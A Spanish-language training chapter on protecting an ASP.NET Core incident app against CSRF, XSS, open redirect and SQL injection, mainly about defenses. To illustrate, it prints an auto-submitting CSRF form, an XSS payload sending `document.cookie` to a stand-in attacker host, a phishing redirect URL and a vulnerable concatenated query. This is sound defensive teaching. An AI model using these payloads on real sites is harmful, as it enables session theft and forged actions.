# 6. Protección contra ataques comunes: CSRF y XSS

Ahora que hay usuarios autenticados, hay algo que robar o suplantar. Este capítulo repasa los dos ataques que el temario pide explícitamente (CSRF y XSS) y otros tres que aparecen en cualquier auditoría (*open redirect*, inyección SQL y cabeceras de seguridad). Gran parte de la protección **ya estaba** en el proyecto desde el día 2: hoy entendemos por qué.

## 6.1 CSRF: falsificación de petición en sitios cruzados

### El ataque

Ana ha iniciado sesión en el Gestor de Incidencias (tiene la cookie). En otra pestaña abre una web maliciosa que contiene:

```html
<form action="https://incidencias.organismo.example/Incidencias/Cerrar/42" method="post">
</form>
<script>document.forms[0].submit();</script>
```

El navegador envía el POST **con la cookie de Ana**, porque las cookies se envían automáticamente al dominio al que pertenecen. Sin protección, la incidencia 42 se cierra en nombre de Ana sin que ella lo sepa.

> Cualquier aplicación que se autentique con **cookie** (Forms Authentication, Identity, Windows) es vulnerable. Web Forms tenía una protección parcial (ViewState con `ViewStateUserKey`), que muchas aplicaciones no configuraban.

### Las defensas (en capas)

| Defensa | Qué hace | En el proyecto |
|---|---|---|
| **Token antiforgery** | Cada formulario lleva un campo oculto `__RequestVerificationToken`, ligado a una cookie y al usuario. La web atacante no puede leerlo (política del mismo origen), así que no puede incluirlo | El Tag Helper `<form method="post">` lo añade solo; `[ValidateAntiForgeryToken]` lo comprueba |
| **Filtro global** `AutoValidateAntiforgeryToken` | Comprueba el token en **todos** los POST/PUT/PATCH/DELETE, aunque alguien olvide el atributo en una acción nueva | **Nuevo hoy** en `AddControllersWithViews(...)` |
| **Razor Pages** | Validan el token siempre, sin configurar nada | `Pages/` |
| **Cookie SameSite=Lax** | El navegador **no envía** la cookie de autenticación en un POST que viene de otro sitio | Valor por defecto de la cookie de Identity |
| **GET no cambia nada** | Un `<img src=".../Cerrar/42">` no puede hacer daño si cerrar exige POST | Todas las acciones que cambian datos son `[HttpPost]` (también el logout) |
| **API con token, no con cookie** | El navegador no añade la cabecera `Authorization` por su cuenta | `[Authorize(AuthenticationSchemes = Esquemas.Token)]` + `[IgnoreAntiforgeryToken]` |

```csharp
// Program.cs — red de seguridad para todo MVC
builder.Services.AddControllersWithViews(o => o.Filters.Add(new AutoValidateAntiforgeryTokenAttribute()));
```

> ⚠️ **SameSite no basta por sí solo:** "sitio" no es lo mismo que "origen" (`malo.organismo.example` y `incidencias.organismo.example` son el **mismo sitio**), hay navegadores antiguos y algunas peticiones de nivel superior sí envían la cookie. El token antiforgery sigue siendo la defensa principal.

**Demostración rápida:** `curl -X POST http://localhost:5196/Cuenta/Login -d "Correo=ana@demo.local"` devuelve **400 Bad Request**: sin token, ni siquiera se llega al controlador (lo comprueba también una prueba de integración, capítulo 8).

### ¿Y si llamo a una acción MVC desde JavaScript?

Hay que enviar el token en una cabecera. Se pinta en la página (por ejemplo, en un `<meta>` o con `@Html.AntiForgeryToken()`) y el `.js` lo copia a la cabecera `RequestVerificationToken` de `fetch`. La documentación oficial (referencias) tiene el ejemplo completo.

## 6.2 XSS: *cross-site scripting*

### El ataque

Un usuario escribe como título de incidencia:

```
<script>fetch('https://malo.example/?c=' + document.cookie)</script>
```

Si la aplicación lo pinta **tal cual** en el listado, el navegador de **cada usuario que abra el listado** ejecuta ese JavaScript con su sesión: puede leer datos, enviar formularios en su nombre o cambiar la página.

### Las defensas

| Defensa | Qué hace | En el proyecto |
|---|---|---|
| **Razor codifica** todo lo que escribe con `@` | `<script>` se convierte en `&lt;script&gt;`: se ve como texto, no se ejecuta | Todas las vistas (lo probamos el día 2) |
| **No usar `@Html.Raw`** con datos de usuario | `Html.Raw` desactiva la codificación | No se usa en ninguna vista |
| **CSP** (*Content Security Policy*) | Aunque se colara un `<script>`, el navegador **no ejecuta** JavaScript *inline* ni de otros orígenes | `ContentSecurityPolicyMiddleware` (día 2): `script-src 'self'; script-src-attr 'none'...` |
| **Cookie HttpOnly** | JavaScript no puede leer la cookie de autenticación: aunque hubiera XSS, no se puede robar la sesión | Por defecto en Identity y en la sesión |
| **Validar la entrada** | Longitudes máximas, formatos | `[StringLength]` y reglas del dominio |

Las tres primeras son **independientes**: si una falla, quedan las otras. Esa es la idea de **defensa en profundidad**.

### Los contextos: HTML no es lo único

Razor codifica para **HTML**. Si un dato acaba en otro contexto, la codificación tiene que ser la de ese contexto:

| Contexto | Correcto | Incorrecto |
|---|---|---|
| Texto HTML | `<td>@incidencia.Titulo</td>` | `<td>@Html.Raw(incidencia.Titulo)</td>` |
| Atributo HTML | `<a title="@visita.Titulo">` (Razor pone las comillas) | `<a title=@visita.Titulo>` construido con concatenación |
| URL | `asp-route-texto="@texto"` (Tag Helper: codifica) | `href="/Incidencias?texto=@texto"` construido a mano con datos sin codificar |
| JavaScript | `data-titulo="@titulo"` en HTML y leerlo desde un `.js` con `dataset` | `<script>var t = '@titulo';</script>` (además, la CSP lo bloquea) |

En C#, fuera de Razor: `HtmlEncoder.Default.Encode(...)`, `JavaScriptEncoder.Default.Encode(...)`, `UrlEncoder.Default.Encode(...)`.

### ¿Y si de verdad hay que guardar HTML?

(Un editor de texto enriquecido para la descripción, por ejemplo.) Entonces se **sanea** con una lista blanca de etiquetas y atributos permitidos, usando una biblioteca mantenida (por ejemplo, el paquete NuGet `HtmlSanitizer`), **al guardar o al pintar**, y solo entonces se usa `Html.Raw`. Nunca con expresiones regulares caseras.

> **En Web Forms** la situación era la contraria: `<asp:Label Text='<%# Eval("Titulo") %>'>` **no** codificaba, había que acordarse de `<%#: ... %>` o `Server.HtmlEncode`. Y `ValidateRequest` (que rechazaba peticiones con `<`) daba una falsa sensación de seguridad. Al migrar SIREI, buscad los sitios donde se escribía HTML a mano (`Response.Write`, `Literal`, `innerHTML` en JavaScript).

## 6.3 *Open redirect*

```
https://incidencias.organismo.example/Cuenta/Login?ReturnUrl=https://incidencias-organismo.example/login-falso
```

El enlace es del dominio auténtico (el usuario confía), pero tras iniciar sesión lo lleva a una copia falsa que le pide de nuevo la contraseña. Defensa en [CuentaController](../../src/day-04/GestorIncidencias.Web/Controllers/CuentaController.cs):

```csharp
return LocalRedirect(Url.IsLocalUrl(formulario.ReturnUrl) ? formulario.ReturnUrl : "/");
```

`Url.IsLocalUrl` rechaza URLs absolutas a otros dominios (y trucos como `//malo.example` o `/\malo.example`), y `LocalRedirect` lanza una excepción si se le pasa una URL que no es local. **Nunca** `Redirect(returnUrl)` con lo que llega de la petición.

## 6.4 Inyección SQL

Lo vimos en el código de SIREI: `"SELECT * FROM Expedientes WHERE Id = " + id`. Con EF Core:

| Código | ¿Seguro? |
|---|---|
| LINQ: `db.Incidencias.Where(i => i.Titulo.Contains(texto))` | ✅ Siempre parametrizado |
| `db.Incidencias.FromSql($"SELECT * FROM Incidencias WHERE Titulo LIKE {patron}")` | ✅ La cadena interpolada se convierte en **parámetros** |
| `db.Incidencias.FromSqlRaw("... WHERE Titulo LIKE '" + patron + "'")` | ❌ Concatenación: inyección SQL |
| ADO.NET con `SqlParameter` | ✅ |

## 6.5 Cabeceras de seguridad y otros básicos

| Cabecera / práctica | Para qué | Estado en el proyecto |
|---|---|---|
| `Content-Security-Policy` | Limitar qué scripts, estilos y marcos se cargan | ✅ Día 2 |
| `Strict-Transport-Security` (HSTS) | Obligar a usar HTTPS | ✅ `UseHsts()` fuera de Development |
| Redirección a HTTPS | — | ✅ `UseHttpsRedirection()` |
| `frame-ancestors` (CSP) | Que nadie meta la aplicación en un `<iframe>` (*clickjacking*) | ✅ En la CSP |
| `X-Content-Type-Options: nosniff` | Que el navegador no "adivine" tipos de contenido | Se puede añadir en el mismo middleware que la CSP |
| No revelar tecnología (`Server`, `X-Powered-By`) | Dar menos pistas | ✅ Día 2 (WebMarkupMin); `Server: Kestrel` se puede quitar con `AddServerHeader = false` |
| Errores sin detalles en producción | Las trazas de error revelan rutas, consultas, versiones | ✅ `UseExceptionHandler` + página de error con solo el identificador |
| Secretos fuera del código y de `appsettings.json` | Cadenas de conexión, claves de cliente OIDC | ✅ Día 1 (variables de entorno, *user secrets*) |

> Para revisar una aplicación de forma ordenada, el **OWASP Top 10** es la lista de referencia. CSRF ya no aparece como categoría propia porque los frameworks modernos lo resuelven por defecto... siempre que no se desactive.

## Referencias

> Enlaces comprobados el 8 de octubre de 2026.

- [Prevención de ataques de falsificación de solicitudes entre sitios (CSRF)](https://learn.microsoft.com/es-es/aspnet/core/security/anti-request-forgery?view=aspnetcore-10.0) — Incluye el ejemplo con JavaScript y cabecera.
- [Prevención de scripts entre sitios (XSS)](https://learn.microsoft.com/es-es/aspnet/core/security/cross-site-scripting?view=aspnetcore-10.0)
- [Prevención de ataques de redireccionamiento abierto](https://learn.microsoft.com/es-es/aspnet/core/security/preventing-open-redirects?view=aspnetcore-10.0)
- [Trabajar con cookies SameSite](https://learn.microsoft.com/es-es/aspnet/core/security/samesite?view=aspnetcore-10.0)
- [Consultas SQL en EF Core](https://learn.microsoft.com/es-es/ef/core/querying/sql-queries) — `FromSql` frente a `FromSqlRaw`.
- [Protección de datos (Data Protection)](https://learn.microsoft.com/es-es/aspnet/core/security/data-protection/introduction?view=aspnetcore-10.0) — Lo que cifra cookies, tokens antiforgery y tokens de Identity.
- [OWASP Top 10](https://owasp.org/projects/top-ten)
- [OWASP: hoja de referencia de CSRF](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html) y [de XSS](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
